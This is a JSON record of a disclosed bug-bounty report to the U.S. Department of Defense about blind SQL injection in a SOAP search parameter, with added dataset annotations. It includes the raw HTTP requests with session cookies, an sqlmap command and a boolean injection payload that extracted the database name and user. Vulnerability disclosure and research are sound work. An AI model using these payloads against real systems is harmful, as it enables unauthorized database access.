{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "hack0neone ",
  "title": "Blind Sql Injection in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
  "content": "\nDescription:\nfirst browse url\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/Storefront\nfind login\nthen notice register\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nclick register\nhttps://\u2588\u2588\u2588\u2588/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/RegisterUser\nclick Choose Facility\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nWe can see a search box\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCode 2.27 KiB\n1POST /DSF/webservices/StorefrontService.asmx HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab200041fc059864d60f7079a5bba1c971a9b0ec2c518a8be95c59408233620a4046e908a71691ce11300072991b95acde4750057dcf4b690fc5d287bd05e77fb374c2ef003c7fa6de858098c8aded9cd3dbae4fb2b4cb23fae3f4\n4Content-Length: 945\n5Sec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"\n6Accept: application/xml\n7Content-Type: application/json;charset=UTF-8\n8Sec-Ch-Ua-Mobile: ?0\n9Soapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration\n10User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\n11Sec-Ch-Ua-Platform: \"Windows\"\n12Origin: https://\u2588\u2588\u2588\n13Sec-Fetch-Site: same-origin\n14Sec-Fetch-Mode: cors\n15Sec-Fetch-Dest: empty\n16Referer: https://\u2588\u2588\u2588\u2588\u2588/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0+f1rjakhLYZYEorRbI5CMSxx2CBgN1b\n17Accept-Encoding: gzip, deflate\n18Accept-Language: zh-CN,zh;q=0.9\n19Connection: close\n20\n21      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>\n22<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>\n23<TimeOut>20</TimeOut>\n24<CultureName>zh-CN</CultureName>\n25\n26      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>\n27<cultureName>zh-CN</cultureName>\n28<sortColumn>description</sortColumn>\n29<sortOrder>asc</sortOrder>\n30<searchValue>*</searchValue>\n31<currentPageIndex>1</currentPageIndex>\n32<recordsToFetch>10</recordsToFetch>\n33\n34      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>\nsearch box exist Blind Sql Injection\nsearchValue is Vulnerability parameters\nsqlmap\npayload\npython2 sqlmap.py -r 11.txt --random-agent --batch --technique=b --dbms=mssql --force-ssl --level 3 --skip-urlencode\n11.txt is Displayed packets\n\u2588\u2588\u2588\ndb_name()=dsfdb\nuser=public\\dsfwsuser\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nReferences\nImpact\nAn attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nCode 2.33 KiB\n1POST /DSF/webservices/StorefrontService.asmx HTTP/1.1\n2Content-Length: 1002\n3Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4Cookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab2000cf04a7295483e1cce16ccb87209e7981813dc0a125020d3f249e89ef86527dcf08fb4cab96113000ae5fba89a9fed5ab8b1354f1c8230167554658dd447c5fc3027504fa66671acba512aa2d0978507583469676a770ea4c\n5Sec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"\n6Accept: application/xml\n7Content-Type: application/json;charset=UTF-8\n8Sec-Ch-Ua-Mobile: ?0\n9Soapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration\n10Sec-Ch-Ua-Platform: \"Windows\"\n11Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n12Sec-Fetch-Site: same-origin\n13Sec-Fetch-Mode: cors\n14Sec-Fetch-Dest: empty\n15Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0 f1rjakhLYZYEorRbI5CMSxx2CBgN1b\n16Accept-Encoding: gzip, deflate\n17Accept-Language: zh-CN,zh;q=0.9\n18User-Agent: Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8\n19Connection: close\n20\n21      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>\n22<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>\n23<TimeOut>20</TimeOut>\n24<CultureName>zh-CN</CultureName>\n25\n26      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>\n27<cultureName>zh-CN</cultureName>\n28<sortColumn>description</sortColumn>\n29<sortOrder>asc</sortOrder>\n30<searchValue>1'  and substring(system_user,1,16)='public\\dsfwsuser' and '%'='</searchValue>\n31<currentPageIndex>1</currentPageIndex>\n32<recordsToFetch>10</recordsToFetch>\n33\n34      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>\nSuggested Mitigation/Remediation Actions\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1694207880,
  "report_url": "https://hackerone.com/reports/2072306",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to the registration page at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/RegisterUser"
    ],
    [
      2,
      "Intercept the SOAP request to GetAllFacilitiesForNewUserRegistration and modify the searchValue parameter to include SQL injection payloads"
    ]
  ],
  "vuln_description": "The application is vulnerable to Blind SQL Injection via the searchValue parameter in the GetAllFacilitiesForNewUserRegistration SOAP request. This allows an attacker to extract database information such as db_name()=dsfdb and user=public\\dsfwsuser.",
  "reason": "While the vulnerability requires understanding SOAP requests and SQL injection techniques, the attack follows standard SQLi patterns and doesn't involve complex application state manipulation or novel logic. The main challenge was identifying the injectable parameter in the SOAP request.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves a Blind SQL Injection in a search parameter within a SOAP request. The methodology described focuses on authentication and authorization bypasses (AuthN/AuthZ) and IDOR vulnerabilities by manipulating user sessions, actions, and resource IDs. However, SQL injection is a different class of vulnerability that exploits input validation flaws to manipulate database queries, not directly related to session or resource ID manipulation. The described methodology does not cover input validation testing or SQL injection detection.",
    "is_detectable": false
  }
}